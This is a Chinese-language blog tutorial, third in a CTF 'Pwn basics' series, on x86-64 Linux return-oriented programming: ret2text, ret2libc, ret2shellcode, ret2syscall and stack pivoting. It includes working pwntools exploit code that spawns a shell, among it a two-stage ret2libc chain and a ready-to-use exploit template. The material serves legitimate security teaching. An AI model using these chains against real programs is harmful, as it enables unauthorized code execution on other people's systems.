---
title: Pwn 入门基础（三）：ROP 技巧全梳理——ret2xxx 与栈迁移
source: https://ip2867.github.io/post/pwn-basics-part3-rop-techniques/
source_host: ip2867.github.io
clip_date: 2026-11-25T10:58:57+08:00
trace_id: c035f818-5b37-48a9-94ab-158a19599bab
content_hash: b488faccb36e9f620586ff8cb984009a0be8efbd24f18502e3ccb24e0d1a0ab9
status: synced
tags: []
series: null
feed_source: Ip2867·Android/逆向
ai_summary: null
ai_summary_style: null
images_status:
  total: 0
  succeeded: 0
  failed_urls: []
notion_page_id: 42375244-d011-8131-b37d-f74bb28f2f23
ioc: null
---

> 前两篇把汇编、栈帧、越界和保护机制的地基打完了。这一篇进入真正的"利用"阶段：当你能控制返回地址之后，跳到哪里、怎么跳、跳过去之后怎么继续，就是 ROP 要解决的问题。
> 
> 本文梳理 ret2text / ret2libc / ret2shellcode / ret2syscall 四种"gadget 来源"，以及栈空间不够时最核心的栈迁移技巧。全文以 x86-64 Linux 为主，32 位的差异沿用前两篇的标注习惯。

* * *

## 零、先记住这几条

1.  **ret2xxx 是"来源"，不是"完整方法"。** ret2 后面的内容指的是 ROP 链中 gadget / 函数地址的"来源区域"，实际题目常常混用多种来源。
2.  **ret2libc 两轮走**：第一轮 `puts@plt(puts@got)` 泄露 libc 基址并返回 main；第二轮 `pop rdi; /bin/sh; ret; system` 拿 shell。
3.  **PLT/GOT 的本质**：函数第一次被调用后，GOT 表里存的就是它在 libc 中的真实运行时地址，所以泄露 GOT 就是泄露 libc。
4.  **栈对齐**：64 位调 libc 函数崩在 `movaps` ，payload 里插一个 `ret` 基本能解决。
5.  **栈迁移核心公式**： `saved rbp = 目标地址 - 8` ，返回地址 = `leave; ret` ，下一次 `leave` 把 `rsp` 迁过去。
6.  **栈迁移后调 system 要预留 0x600 字节**，否则踩空崩溃。

* * *

## 一、先建立全局认知：ret2xxx 是"来源"，不是"完整方法"

学习 ROP 时常见 ret2text、ret2libc、ret2shellcode、ret2syscall 这些名词。 **ret2 后面的内容，指的是 ROP 链中 gadget / 函数地址的"来源区域"。**

回忆第一篇的虚拟地址空间：

```text
高地址
+----------------------+
|   stack              |  ← ret2shellcode（无 NX 时）
+----------------------+
|   dynamic libraries  |  ← ret2libc（libc 中的 system / gadgets）
+----------------------+
|   heap               |
+----------------------+
|   ELF                |  ← ret2text（.text 段里的 win / gadgets）
+----------------------+
低地址
```

这四者不是互斥的完整利用方法，而是 **一段完整利用链中的某一环**。实际题目常常混用：先用 ret2text 里的 `puts@plt` 泄露 libc，再 ret2libc 调 `system` ，栈空间不够时用栈迁移把链搬到 bss / heap。

* * *

## 二、ret2text：跳到程序自己的代码段

### 2.1 原理

`.text` 段存放程序的可执行代码。如果程序里存在一段"有用的代码"——最常见的就是后门函数 `win()` ——直接把返回地址覆盖成它的地址即可。

这正是前两篇反复出现的 ret2win：

```python
payload = b'A' * 72 + p64(win_addr)
```

### 2.2 适用条件

-   **无 PIE（或已泄露 PIE 基址）**：`.text` 地址固定，能硬编码；
-   **程序里有现成的后门函数**，或存在能拼出简单功能的 gadget。

### 2.3 局限

后门函数不是每次都有。没有后门时，就需要 ret2text 里的 gadget 来搭 ROP 链，或者转向 libc（ret2libc）。

* * *

## 三、ret2libc：转向动态链接库

### 3.1 为什么需要 libc

程序通常只调用 `system` 的 PLT 入口，真正的 `system` 函数体在 libc 里。libc 加载地址随机（ASLR），所以 ret2libc 比 ret2text 多一步： **先泄露 libc 基址**。

### 3.2 PLT / GOT：理解动态链接的跳转链

动态链接库的函数在程序里不是直接调用，而是经过两层表：

```text
call puts@plt
   │
   ▼
puts@plt  ──检查 GOT──▶  puts@got
                          │
                          ├─ 已加载：GOT 里存真实地址 → 直接 jmp 过去
                          └─ 未加载：调用 _dl_runtime_resolve 加载，
                                     把真实地址写回 GOT，再 jmp
```

**关键结论**：函数第一次被调用后，GOT 表里存的就是它在 libc 中的真实运行时地址。

所以泄露思路很直接：

```text
puts@plt(puts@got)   → 把 GOT 里的真实地址当参数打印出来
```

拿到 puts 的真实地址后：

```python
libc_base = leaked_puts_addr - libc.sym["puts"]   # 减去 libc 静态偏移
```

因为 libc 在内存里是连续映射的，知道任意一个符号的真实地址和它的静态偏移，就能算出整个 libc 的基址，进而得到 `system` 、 `/bin/sh` 、任意 gadget。

### 3.3 完整利用链（两轮）

**第一轮：泄露 libc 基址**

```python
payload  = b"a" * 0x28
payload += p64(pop_rdi)      # 第 1 个参数 = puts@got
payload += p64(puts_got)
payload += p64(puts_plt)     # 调用 puts(puts@got)，打印真实地址
payload += p64(main_addr)    # 返回 main，重新给一次溢出机会
p.send(payload)

puts_addr = u64(p.recvuntil(b"\x7f")[-6:].ljust(8, b"\x00"))
libc_base = puts_addr - libc.sym["puts"]
```

> `recvuntil(b"\x7f")` 是因为 64 位 libc 地址通常以 `0x7f` 开头；取最后 6 字节再补 `\x00` ，是因为 puts 遇到 `\x00` 会停，实际打印不出完整 8 字节。

**第二轮：调用 system("/bin/sh")**

```python
system_addr = libc_base + libc.sym["system"]
binsh_addr  = libc_base + next(libc.search(b"/bin/sh"))

payload  = b"a" * 0x28
payload += p64(pop_rdi)
payload += p64(binsh_addr)
payload += p64(ret)              # ⚠️ 栈对齐，见下文
payload += p64(system_addr)
p.send(payload)
```

### 3.4 栈对齐：ret2libc 最常见的坑

调用 `system` 时程序可能崩在 `movaps` 指令上：

```text
xmm0 等寄存器是 128 位的，往内存存取值时要求 16 字节对齐
此时 rsp + 0x50 的末位是 8，没对齐 → movaps 触发段错误
```

**解决方法**：在 `system` 前插入一个单独的 `ret` gadget，让 `rsp` 多下移 8 字节，补上对齐。

```python
payload += p64(ret)         # 仅起对齐作用，不改变逻辑
payload += p64(system_addr)
```

> **记忆**：64 位下调用 libc 函数，payload 里插一个 `ret` 基本能解决对齐崩溃。具体要不要插，看 `rsp` 末位是否为 8。

### 3.5 小结表

| 步骤  | 目的  | 关键 API |
| --- | --- | --- |
| 第一轮 | 泄露 libc 基址 | `puts@plt(puts@got)` + 返回 main |
| 计算  | 求 system / /bin/sh | `libc_base + libc.sym[...]` |
| 第二轮 | 拿 shell | `pop rdi; /bin/sh; ret; system` |

* * *

## 四、ret2shellcode：往可执行内存里写代码

### 4.1 原理

如果程序存在 **可写且可执行** 的内存（未开 NX 的栈、mmap 出的 rwx 区域、mprotect 改权限后的页），可以先写入 shellcode，再控制返回地址跳过去执行。

### 4.2 使用场景

-   **没开 NX**：栈可执行，直接往栈上写 shellcode 再跳；
-   **功能复杂**：比如需要反弹 shell，ROP 链太长，不如直接执行 shellcode。

### 4.3 生成 shellcode

用 pwntools 的 `shellcraft` + `asm` ：

```python
shellcode = asm(shellcraft.sh())    # 生成 execve("/bin/sh", 0, 0) 的机器码
```

### 4.4 示例：mmap 出 rwx 内存

```c
#include <sys/mman.h>

int main() {
    mmap(0xdead0000, 0x1000, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);
    // 7 = 0x22 = MAP_PRIVATE|MAP_ANONYMOUS（不是 0x21！）
    char *p = (char *)0xdead0000;
    char str[0x20];
    read(0, p, 0x1000);     // 往可执行内存写 shellcode
    read(0, str, 0x50);     // 栈溢出
    return 0;
}
```

exp：

```python
p.send(asm(shellcraft.sh()).ljust(0x1000, b"\x00"))   # 先写 shellcode 到 0xdead0000

payload  = b"A" * 0x38
payload += p64(0xDEAD0000)                             # 返回地址指向 shellcode
p.send(payload)
```

> ⚠️ mmap flags 的正确组合是 `0x22` （ `MAP_PRIVATE|MAP_ANONYMOUS` ），不是 `0x21` 。 `0x21 = MAP_SHARED|MAP_ANONYMOUS` 不是常用组合。

### 4.5 与 NX 的关系

-   **NX 关闭**：ret2shellcode 最直接；
-   **NX 开启**：需要先 `mprotect` 改权限，本质上是 ROP + shellcode 的组合，属于 NX 绕过范畴（见第一篇保护机制部分）。

* * *

## 五、ret2syscall：直接走系统调用

### 5.1 原理

不调用 libc 函数，而是通过 gadget 布置寄存器，直接触发 `syscall` 指令执行系统调用。

64 位 Linux 系统调用约定：

| 寄存器 | 作用  |
| --- | --- |
| rax | 系统调用号（如 execve = 59） |
| rdi | 第 1 个参数 |
| rsi | 第 2 个参数 |
| rdx | 第 3 个参数 |
| syscall | 触发调用 |

`execve("/bin/sh", 0, 0)` 的 ROP 链大致是：

```text
pop rax; ret       → 59
pop rdi; ret       → "/bin/sh" 地址
pop rsi; ret       → 0
pop rdx; ret       → 0
syscall
```

### 5.2 适用场景

-   **没有 libc 可用** （静态链接、libc 版本未知、题目只给二进制）；
-   **需要规避 libc 相关保护或版本差异**。

实际 CTF 中 ret2syscall 出现频率低于 ret2libc，但在静态链接或 libc 不可用的题里是必选项。

* * *

## 六、栈迁移：栈空间不够时的核心技巧

### 6.1 为什么需要栈迁移

溢出空间不够时（比如只能覆盖到返回地址，写不下完整 ROP 链），需要先把 ROP 链构造在别处（bss、堆、栈上更远的位置），再把 `rsp` 迁移过去执行。

### 6.2 原理：leave; ret 的控制链

回顾函数结尾：

```asm
leave   ≡  mov rsp, rbp ; pop rbp
ret     ≡  pop rip
```

拆解执行过程：

```text
① mov rsp, rbp    → rsp 移到当前 rbp
② pop rbp         → 弹出 saved rbp，恢复调用者的 rbp
③ pop rip         → 弹出返回地址，跳转
```

**关键洞察**：

-   第 ② 步弹出的值来自栈上 `[rbp]` 位置，也就是上一个栈帧的 rbp；
-   如果我们在溢出时覆盖了这个 saved rbp，就控制了 rbp 寄存器；
-   下一次执行 `leave` 时， `mov rsp, rbp` 会把 `rsp` 设成我们控制的地址——栈就迁移过去了。

**一句话**：控制 saved rbp → 控制 rbp → 下一次 leave 控制 rsp → 栈迁移完成。

对于 ROP 来说，控制 `rsp` 就够了，因为 `ret` 永远从 `rsp` 取地址。

### 6.3 入门级栈迁移：提前写入已知地址

```c
char buf[0x1000];          // .bss 段，地址固定（无 PIE）

int main() {
    char str[0x20];
    read(0, buf, 0x1000);  // 第一次：把 ROP 链写到 buf
    read(0, str, 0x30);    // 第二次：溢出，做栈迁移
    return 0;
}
```

**思路**：

-   第一次 read 把完整 ROP 链写进 buf（地址已知，如 0x404060）；
-   第二次 read 溢出 str，覆盖 saved rbp 为 `buf - 8` ，返回地址为 `leave; ret` ；
-   main 结尾 `leave` 时，rsp 被设到 buf 附近，ret 开始执行 buf 里的 ROP 链。

**payload 构造**：

```python
# 第一次：往 buf 写 ROP 链
payload = flat({
    0xE00: [                 # 留足空间（system 需要大量栈空间）
        p64(0xdeadbeef),     # padding，对应 leave 时的 pop rbp
        p64(pop_rdi),
        p64(puts_got),
        p64(puts_plt),
        p64(main_addr),
    ]
})
p.sendafter(b"Read 1\n", payload)

# 第二次：溢出 str，迁移栈
payload = flat({
    0x20: [                  # str[0x20] 之后是 saved rbp
        p64(buf_addr - 8),   # 覆盖 saved rbp → 控制 rbp
        p64(leave_ret),      # 返回地址指向 leave; ret
    ]
})
p.sendafter(b"Read 2\n", payload)
```

**为什么 saved rbp 写 `buf - 8` ？**

第二次 leave 的执行：

```text
mov rsp, rbp      → rsp = buf - 8
pop rbp           → 弹出 [buf-8]，rsp = buf
pop rip           → 弹出 [buf]，跳到 buf 里的第一个 gadget
```

所以 `buf - 8` 位置放 padding（被 pop rbp 吃掉）， `buf` 开始才是真正的 ROP 链。

### 6.4 ⚠️ system 需要预留 0x600 字节栈空间

原文特别提示：栈迁移后调用 `system` ，栈顶（低地址方向）要预留 **0x600 字节以上**。因为 `system` 内部会压栈、调用 `do_system` 、使用较大局部变量，空间不够会踩到未映射页崩溃。

所以 ROP 链在 buf 里的起始偏移要留足（示例用 0xE00）。

### 6.5 进阶栈迁移：只能往栈上写

```c
char buf[0x3000];              // 保证 .bss 有足够空间

int main() {
    char str[0x1000];
    read(0, str, 0x1010);      // 只有一次机会，且只能写到栈上
    return 0;
}
```

这里没法提前把 ROP 链写到 bss。但观察汇编：

```asm
lea rax, [rbp-0x1000]     ; read 的缓冲区地址由 rbp 计算
```

**关键洞察**： `read` 的目标地址是 `rbp - 0x1000` 。如果先通过第一次栈迁移控制 `rbp` ，那么下一次 `read` 就会写到任意地址（任意地址写）。

所以进阶思路是两段式：

```text
第一段：控制 rbp → 让 read 写到 bss
第二段：read 把 ROP 链写进 bss
第三段：再次栈迁移，rsp 指向 bss，执行 ROP 链
```

> ⚠️ 这一节的 exp 骨架只是一个示意，实际 payload 需要根据具体题目调试。核心是理解"控制 rbp 就能控制 read 的目标地址"这个原理。

### 6.6 堆与栈迁移

更复杂的场景：ROP 链在堆上（堆漏洞泄露 / 写入），栈迁移的目标是堆地址。原理相同，只是 saved rbp 指向堆上的链。

另外 `setcontext` gadget 可以一次性控制大部分寄存器（包括 `rsp` ），是栈迁移的高级工具：

```asm
setcontext+offset:
    mov rsp, [rdi + 0xa0]    ; 从 rdi 指向的结构体里恢复 rsp
    ...
```

如果能控制 `rdi` 指向一块伪造的 ucontext 结构，就能直接设置 `rsp` 、 `rip` 等，无需依赖 `leave; ret` 。这在堆题（如 tcache poisoning）中非常常用。

* * *

## 七、把四种 ret2xxx 和栈迁移串起来

### 7.1 选择决策树

```text
有后门函数？
  ├─ 是 → ret2text（直接跳 win）
  └─ 否 → 需要调用 libc 函数？
            ├─ 是 → ret2libc
            │       ├─ 有 PIE？ → 先泄露 PIE 基址
            │       ├─ 有 ASLR？ → 先泄露 libc 基址（puts@plt(puts@got)）
            │       └─ 栈空间够？ → 够：直接 ROP；不够：栈迁移
            └─ 否 → 需要执行自定义代码？
                      ├─ 有 rwx 内存？ → ret2shellcode
                      └─ 无 libc 可用？ → ret2syscall
```

### 7.2 与前两篇的衔接

| 前两篇知识 | 在本篇的落点 |
| --- | --- |
| 寄存器 / 传参约定 | `pop rdi; ret` 布置参数 |
| call / ret 栈效果 | 栈迁移原理的基础 |
| 栈帧布局 | 计算偏移、理解 leave 拆解 |
| Canary | ret2libc 第一轮泄露时若开了 Canary，需先泄露 canary |
| PIE / ASLR | ret2libc 必须先泄露基址；Partial Overwrite 可绕过 |
| NX  | 决定走 ret2shellcode 还是 ROP / mprotect |
| RELRO | 决定能否 GOT 覆写；Full RELRO 转向 `__exit_funcs` / vtable |

* * *

## 八、完整 ret2libc exp 模板（可直接套用）

```python
#!/usr/bin/python3
from pwn import *

context.arch = "amd64"
context.log_level = "debug"

p    = process("./a.out")
elf  = ELF("./a.out")
libc = ELF("./libc-2.31.so")     # 题目给的 libc

# ⚠️ 这两个地址是示例值，实际需要用 ROPgadget 或 pwntools 的 ROP 查找
pop_rdi = 0x4011F3                # ROPgadget --binary ./a.out | grep "pop rdi"
ret     = 0x40101A                # 用于栈对齐

# ---------- 第一轮：泄露 libc ----------
payload  = b"a" * 0x28
payload += p64(pop_rdi)
payload += p64(elf.got["puts"])
payload += p64(elf.plt["puts"])
payload += p64(elf.sym["main"])
p.send(payload)

leak = u64(p.recvuntil(b"\x7f")[-6:].ljust(8, b"\x00"))
libc_base = leak - libc.sym["puts"]
log.success(f"libc_base = {hex(libc_base)}")

# ---------- 第二轮：system("/bin/sh") ----------
system = libc_base + libc.sym["system"]
binsh  = libc_base + next(libc.search(b"/bin/sh"))

payload  = b"a" * 0x28
payload += p64(pop_rdi)
payload += p64(binsh)
payload += p64(ret)               # 栈对齐
payload += p64(system)
p.send(payload)

p.interactive()
```

* * *

## 九、关键记忆点

1.  **ret2xxx 是 gadget 来源，不是完整方法**：text 来自.text，libc 来自动态库，shellcode 来自可执行内存，syscall 走系统调用。
2.  **ret2libc 两轮走**：第一轮 `puts@plt(puts@got)` 泄露并返回 main；第二轮 `pop rdi; /bin/sh; ret; system` 。
3.  **PLT/GOT 的本质**：第一次调用后 GOT 里存真实地址，泄露 GOT 就是泄露 libc。
4.  **栈对齐**：64 位调 libc 函数崩在 `movaps` ，payload 里插一个 `ret` 即可。
5.  **栈迁移核心公式**： `saved rbp = 目标地址 - 8` ，返回地址 = `leave; ret` ，下一次 `leave` 把 `rsp` 迁过去。
6.  **栈迁移后调 system 要预留 0x600 字节**，否则踩空崩溃。
7.  **进阶栈迁移利用 rbp 参与 read 地址计算**：控制 rbp 就能任意地址写，再二次迁移。
8.  **setcontext 是高级迁移工具**，可直接设置 `rsp` / `rip` ，堆题常用。

* * *

## 十、练习路线建议

```text
① 无保护 ret2text：手算偏移，跳 win
② 开 NX 的 ret2libc：完整两轮，练 GOT 泄露和栈对齐
③ 栈空间不足：练入门级栈迁移（bss 预写 + leave; ret）
④ 只能写栈：练进阶栈迁移（控制 rbp 做任意地址写）
⑤ 堆题 + setcontext：练堆上构造 ucontext 迁移
⑥ 开 Canary + PIE + Full RELRO 的综合题：把三篇知识全部串起来
```

做到看到一道题能先 checksec，再判断"有没有后门 / 能不能泄露 / 栈空间够不够 / 要不要迁移"，然后直接套模板写出 exp，Pwn 入门就真正完成了。
